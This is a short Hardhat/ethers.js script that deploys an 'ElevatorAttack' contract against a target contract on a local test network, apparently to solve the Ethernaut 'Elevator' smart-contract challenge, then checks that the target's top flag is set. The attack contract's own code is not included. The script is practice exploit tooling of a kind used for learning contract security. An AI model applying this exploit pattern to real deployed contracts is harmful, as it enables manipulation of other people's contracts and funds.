const { ethers } = require("hardhat");
const { assert } = require("chai");
const CONTRACT_ADDRESS = "0x24B3c7704709ed1491473F30393FFc93cFB0FC34";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
// Create a JsonRpcProvider instance that connects to the local network
const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");

//   Create a wallet instance (for signing transactions)
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

async function main() {
  // Deploy the Contract
  const ElevatorAttackFactory = await ethers.getContractFactory(
    "ElevatorAttack",
    wallet
  );
  const elevatorAttack = await ElevatorAttackFactory.deploy(CONTRACT_ADDRESS);
  await elevatorAttack.deployed();
  console.log("ElevatorAttack Contract deployed to:", elevatorAttack.address);

  const contractInterface = [
    "function goTo(uint256 _floor) public",
    "function floor() public view returns (uint256)",
    "function top() public view returns (bool)",
  ];
  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    wallet
  );
  const floor = await contract.floor();
  console.log(`default floor ${floor.toString()}`);

  await elevatorAttack.attack();
  assert.equal(await contract.top(), true);
}
main().catch((error) => {
  console.error(error);
  process.exit(1);
});
